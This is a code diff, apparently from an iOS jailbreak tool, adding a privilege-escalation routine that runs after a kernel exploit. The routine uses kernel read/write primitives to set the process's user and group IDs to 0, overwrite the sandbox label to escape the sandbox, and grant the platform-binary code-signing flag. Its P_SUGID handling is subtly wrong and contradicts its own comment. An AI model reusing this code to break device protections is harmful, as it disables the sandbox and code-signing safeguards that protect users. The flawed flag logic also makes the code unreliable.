@@ -9,10 +9,18 @@
 #import "EnvironmentManager.h"
 #import "ExploitManager.h"
 #import <sys/stat.h>
-#import "Util.h"
 #import <compression.h>
 #import <xpf/xpf.h>
-#include <dlfcn.h>
+#import <dlfcn.h>
+#import <libjailbreak/primitives_external.h>
+#import <libjailbreak/codesign.h>
+#import <libjailbreak/primitives.h>
+#import <libjailbreak/primitives_IOSurface.h>
+#import <libjailbreak/physrw_pte.h>
+#import <libjailbreak/translation.h>
+#import <libjailbreak/kernel.h>
+#import <libjailbreak/info.h>
+#import <libjailbreak/util.h>
 
 NSString *const JBErrorDomain = @"JBErrorDomain";
 typedef NS_ENUM(NSInteger, JBErrorCode) {
@@ -22,15 +30,10 @@ typedef NS_ENUM(NSInteger, JBErrorCode) {
     JBErrorCodeFailedExploitation            = -4,
     JBErrorCodeFailedBuildingPhysRW          = -5,
     JBErrorCodeFailedCleanup                 = -6,
+    JBErrorCodeFailedGetRoot                 = -7,
+    JBErrorCodeFailedUnsandbox               = -8,
+    JBErrorCodeFailedPlatformize             = -9,
 };
-
-#include <libjailbreak/primitives_external.h>
-#include <libjailbreak/primitives.h>
-#include <libjailbreak/primitives_IOSurface.h>
-#include <libjailbreak/physrw_pte.h>
-#include <libjailbreak/translation.h>
-#include <libjailbreak/kernel.h>
-#include <libjailbreak/info.h>
 
 @implementation Jailbreaker
 
@@ -140,6 +143,49 @@ typedef NS_ENUM(NSInteger, JBErrorCode) {
     return nil;
 }
 
+- (NSError *)elevatePrivileges
+{
+    uint64_t proc = proc_self();
+    uint64_t ucred = proc_ucred(proc);
+    
+    // Get uid 0
+    kwrite32(proc + koffsetof(proc, svuid), 0);
+    kwrite32(ucred + koffsetof(ucred, svuid), 0);
+    kwrite32(ucred + koffsetof(ucred, ruid), 0);
+    kwrite32(ucred + koffsetof(ucred, uid), 0);
+    
+    // Get gid 0
+    kwrite32(proc + koffsetof(proc, svgid), 0);
+    kwrite32(ucred + koffsetof(ucred, rgid), 0);
+    kwrite32(ucred + koffsetof(ucred, svgid), 0);
+    kwrite32(ucred + koffsetof(ucred, groups), 0);
+    
+    // Add P_SUGID
+    uint32_t flag = kread32(proc + koffsetof(proc, flag));
+    if ((flag & P_SUGID) != 0) {
+        flag &= P_SUGID;
+        kwrite32(proc + koffsetof(proc, flag), flag);
+    }
+    
+    if (getuid() != 0) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedGetRoot userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Failed to get root, uid still %d", getuid()]}];
+    if (getgid() != 0) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedGetRoot userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Failed to get root, gid still %d", getgid()]}];
+    
+    // Unsandbox
+    uint64_t label = kread_ptr(ucred + koffsetof(ucred, label));
+    kwrite64(label + 0x10, -1);
+    NSError *error = nil;
+    [[NSFileManager defaultManager] contentsOfDirectoryAtPath:@"/var" error:&error];
+    if (error) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedUnsandbox userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Failed to unsandbox, /var does not seem accessible (%s)", error.description.UTF8String]}];
+    
+    // Get CS_PLATFORM_BINARY
+    proc_csflags_set(proc, CS_PLATFORM_BINARY);
+    uint32_t csflags;
+    csops(getpid(), CS_OPS_STATUS, &csflags, sizeof(csflags));
+    if (!(csflags & CS_PLATFORM_BINARY)) return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedPlatformize userInfo:@{NSLocalizedDescriptionKey:@"Failed to get CS_PLATFORM_BINARY"}];
+    
+    return nil;
+}
+
 - (NSError *)run
 {
     NSError *err = nil;
@@ -153,7 +199,14 @@ typedef NS_ENUM(NSInteger, JBErrorCode) {
     if (err) return err;
     
     NSLog(@"We out here! %x\n", kread32(kconstant(base)));
-    physwrite64(kread64(pmap_self() + koffsetof(pmap, ttep)) + (7*8), 0x4141414141414141);
+    err = [self elevatePrivileges];
+    if (err) return err;
+    
+    NSLog(@"UID %d", getuid());
+    
+    NSError *error = nil;
+    NSArray *test = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:@"/var" error:&error];
+    NSLog(@"test = %@, error = %@", test, error);
     
     return nil;
 }
